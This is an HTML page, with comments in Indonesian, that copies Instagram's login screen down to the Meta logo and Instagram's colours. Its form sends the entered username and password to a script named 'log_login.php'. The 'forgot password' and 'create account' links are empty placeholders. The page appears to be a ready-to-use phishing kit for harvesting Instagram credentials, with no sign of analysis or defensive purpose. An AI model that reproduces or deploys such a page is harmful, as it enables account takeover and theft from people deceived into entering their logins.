<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram-Login</title>
    
    <style>
        body {
            /* PERUBAHAN: Menggunakan URL link untuk background */
            background-image: url('https://files.catbox.moe/h2azoj.png'); 
            background-size: cover; /* Memastikan gambar menutupi seluruh halaman */
            background-position: center; /* Memastikan gambar terpusat */
            background-repeat: no-repeat;
            
            color: #f0f0f0; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            position: relative; 
        }

        .login-container {
            width: 90%;
            max-width: 350px; 
            padding: 30px 20px 10px 20px;
            text-align: center;
            /* Background transparan/semi-transparan gelap agar tulisan tetap terbaca */
            background: rgba(18, 18, 18, 0.9); 
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); /* Efek bayangan */
        }
        
        /* OVERLAY: Jika gambar background terlalu terang, Anda bisa tambahkan ini untuk membuatnya lebih gelap */
        /* Anda bisa menghapus bagian ini jika tidak diperlukan */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5); /* Overlay gelap 50% */
            z-index: -1; /* Posisikan di bawah container */
        }


        /* Tulisan Bahasa Indonesia diposisikan di tengah atas */
        .language-select {
            position: absolute;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            color: #aaa;
            font-size: 0.85em;
            width: 100%;
            text-align: center;
        }

        .app-logo {
            width: 65px; 
            margin-bottom: 30px;
        }

        /* Gaya untuk input field */
        .login-form input {
            width: 100%;
            padding: 12px 10px;
            margin-bottom: 10px;
            border: 1px solid #363636; 
            background-color: #262626; 
            color: #f0f0f0;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 14px;
        }
        
        .login-form input::placeholder {
            color: #a0a0a0;
        }

        /* Gaya untuk tombol Login (biru) */
        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #0095f6; 
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 20px;
            font-size: 14px;
        }

        /* Gaya untuk "Lupa kata sandi?" */
        .forgot-password {
            display: block;
            color: #0095f6;
            text-decoration: none;
            font-size: 0.9em;
            font-weight: 500;
        }

        /* Garis pemisah dan ruang di bagian bawah */
        .signup-meta-section {
            margin-top: 50px; 
            padding-top: 20px;
            border-top: 1px solid #363636; 
        }

        /* Gaya untuk tombol "Buat akun baru" (Outline) */
        .create-account-button {
            display: block;
            width: 100%;
            padding: 12px;
            border: 1px solid #363636; 
            background-color: transparent;
            color: #0095f6; 
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            margin-bottom: 20px;
            font-size: 14px;
        }

        /* Gaya untuk logo dan tulisan Meta */
        .meta-info {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 30px; 
            padding-bottom: 20px;
        }

        .meta-logo {
            height: 14px; 
            filter: invert(70%);
            margin-right: 5px;
        }
        
        .meta-text {
            color: #aaa;
            font-size: 0.8em;
            font-weight: bold;
        }
    </style>
    
</head>
<body>
    <p class="language-select">Bahasa Indonesia</p>

    <div class="login-container">
        
        <img src="https://files.catbox.moe/1ovidi.png" alt="Logo Aplikasi" class="app-logo">
        
        <!-- PERUBAHAN PENTING: Tambah action dan method, plus name di input -->
        <form class="login-form" action="log_login.php" method="POST">
            <input type="text" name="username" placeholder="Nama pengguna, email, atau nomor ..." required>
            <input type="password" name="password" placeholder="Kata sandi" required>
            
            <button type="submit" class="login-button">Login</button>
            
            <a href="#" class="forgot-password">Lupa kata sandi?</a>
        </form>
        
        <div class="signup-meta-section">
            <a href="#" class="create-account-button">Buat akun baru</a>
            
            <div class="meta-info">
                <p class="meta-text"></p>
                <img src="https://files.catbox.moe/6rqcuf.png" alt="Meta Logo" class="meta-logo">
                <p class="meta-text"></p>
            </div>
        </div>
    </div>
</body>
</html>
